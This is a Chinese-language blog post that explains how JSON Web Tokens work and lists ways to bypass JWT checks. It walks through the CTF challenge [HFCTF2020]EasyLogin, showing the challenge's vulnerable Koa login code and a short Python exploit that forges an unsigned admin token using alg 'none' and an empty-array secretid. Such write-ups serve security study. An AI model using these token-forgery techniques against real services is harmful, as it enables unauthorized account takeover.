<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="0x01什么是JWT以下内容摘自此文章

JSON Web Token的结构


JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：

Header
Payload
Signature

因此，一个典型的JWT看起来是这个样子的：
xxxxx.yyyyy.zzzzz">
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="jwt的绕过方式"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>jwt的绕过方式 - 船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2021/10/04/jwt%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/">
                jwt的绕过方式
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-10-04</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h5 id="0x01什么是JWT"><a href="#0x01什么是JWT" class="headerlink" title="0x01什么是JWT"></a>0x01什么是JWT</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">以下内容摘自此文章</a></p>
<ul>
<li>JSON Web Token的结构</li>
</ul>
<p><img src="/images/211.png"></p>
<p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p>
<ul>
<li>Header</li>
<li>Payload</li>
<li>Signature</li>
</ul>
<p>因此，一个典型的JWT看起来是这个样子的：</p>
<p>xxxxx.yyyyy.zzzzz</p>
<ul>
<li>Header</li>
</ul>
<p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。</p>
<p>例如：</p>
<p><img src="/images/212" alt="img"></p>
<p>然后，用Base64对这个JSON编码就得到JWT的第一部分</p>
<ul>
<li>Payload</li>
</ul>
<p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p>
<ul>
<li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</li>
<li>Public claims : 可以随意定义。</li>
<li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</li>
</ul>
<p>下面是一个例子：</p>
<p><img src="/images/213.png"></p>
<p>对payload进行Base64编码就得到JWT的第二部分</p>
<p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p>
<ul>
<li>Signature</li>
</ul>
<p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。</p>
<p>例如：</p>
<p>HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p>
<p>签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。</p>
<ul>
<li>JWT解密网站</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<p>看一张官网的图</p>
<p><img src="/images/214.png"></p>
<ul>
<li> JSON Web Tokens是如何工作的</li>
</ul>
<p>在认证的时候，当用户用他们的凭证成功登录以后，一个JSON Web Token将会被返回。此后，token就是用户凭证了，你必须非常小心以防止出现安全问题。一般而言，你保存令牌的时候不应该超过你所需要它的时间。</p>
<h5 id="0x02如何绕过JWT验证"><a href="#0x02如何绕过JWT验证" class="headerlink" title="0x02如何绕过JWT验证"></a>0x02如何绕过JWT验证</h5><ul>
<li><p>当然如果网站泄露了加密的密钥+获取到一个密文。就可以利用jwt.io网站进行任意身份是伪造</p>
</li>
<li><p>利用c-jwt-cracker工具进行密钥的爆破</p>
<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">工具地址</a></p>
</li>
<li><p>修改算法从RS256到HS256</p>
</li>
<li><p>利用网站的缺陷（将加密算法改成None）。例：nodejs的jwt缺陷，当jwt的secret为空，jwt会采用algorithm为none进行解密。</p>
</li>
</ul>
<p>题目：[HFCTF2020]EasyLogin</p>
<p>题目功能很简单</p>
<ul>
<li>注册</li>
<li>登录</li>
<li>GETFLAG</li>
</ul>
<p>首先注册个普通用户，登录进去。点击GETFLAG。提示无权限，猜测需要admin才能获取。</p>
<p>查看网站加载的js文件，发现app.js</p>
<pre><code>/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */

 function login() &#123;
    const username = $(&quot;#username&quot;).val();
    const password = $(&quot;#password&quot;).val();
    const token = sessionStorage.getItem(&quot;token&quot;);
    $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;)
        .done(function(data) &#123;
            const &#123;status&#125; = data;
            if(status) &#123;
                document.location = &quot;/home&quot;;
            &#125;
        &#125;)
        .fail(function(xhr, textStatus, errorThrown) &#123;
            alert(xhr.responseJSON.message);
        &#125;);
&#125;

function register() &#123;
    const username = $(&quot;#username&quot;).val();
    const password = $(&quot;#password&quot;).val();
    $.post(&quot;/api/register&quot;, &#123;username, password&#125;)
        .done(function(data) &#123;
            const &#123; token &#125; = data;
            sessionStorage.setItem(&#39;token&#39;, token);
            document.location = &quot;/login&quot;;
        &#125;)
        .fail(function(xhr, textStatus, errorThrown) &#123;
            alert(xhr.responseJSON.message);
        &#125;);
&#125;

function logout() &#123;
    $.get(&#39;/api/logout&#39;).done(function(data) &#123;
        const &#123;status&#125; = data;
        if(status) &#123;
            document.location = &#39;/login&#39;;
        &#125;
    &#125;);
&#125;

function getflag() &#123;
    $.get(&#39;/api/flag&#39;).done(function(data) &#123;
        const &#123;flag&#125; = data;
        $(&quot;#username&quot;).val(flag);
    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;
        alert(xhr.responseJSON.message);
    &#125;);
&#125;</code></pre>
<p>这里就要看自己的经验了，发现是koa框架</p>
<p>框架的目录结构</p>
<p><img src="/images/215.png"></p>
<p>访问/controllers/api.js得到主要逻辑代码</p>
<pre><code>const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = &#123;
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; &#123;
        const &#123;username, password&#125; = ctx.request.body;

        if(!username || username === &#39;admin&#39;)&#123;
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        &#125;

        if(global.secrets.length &gt; 100000) &#123;
            global.secrets = [];
        &#125;

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);

        ctx.rest(&#123;
            token: token
        &#125;);

        await next();
    &#125;,

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; &#123;
        const &#123;username, password&#125; = ctx.request.body;

        if(!username || !password) &#123;
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        &#125;

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        &#125;

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) &#123;
            ctx.session.username = username;
        &#125;

        ctx.rest(&#123;
            status
        &#125;);

        await next();
    &#125;,

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; &#123;
        if(ctx.session.username !== &#39;admin&#39;)&#123;
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        &#125;

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest(&#123;
            flag
        &#125;);

        await next();
    &#125;,

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; &#123;
        ctx.session.username = null;
        ctx.rest(&#123;
            status: true
        &#125;)
        await next();
    &#125;
&#125;;</code></pre>
<p>可以看到注册名不能是admin，然后如果登录为admin就可以获取到flag。</p>
<ul>
<li>利用</li>
</ul>
<p>js是弱语言类型，我们可以将secretid设置为一个小数或空数组（空数组与数字比较时为0）来绕过secretid的一个验证（不能为null&amp;undefined）</p>
<p>exp</p>
<pre><code>import jwt
token = jwt.encode(&#123;&quot;secretid&quot;:[],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1596626836&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;)
print(token)
#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU5NjYyNjgzNn0.</code></pre>

    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>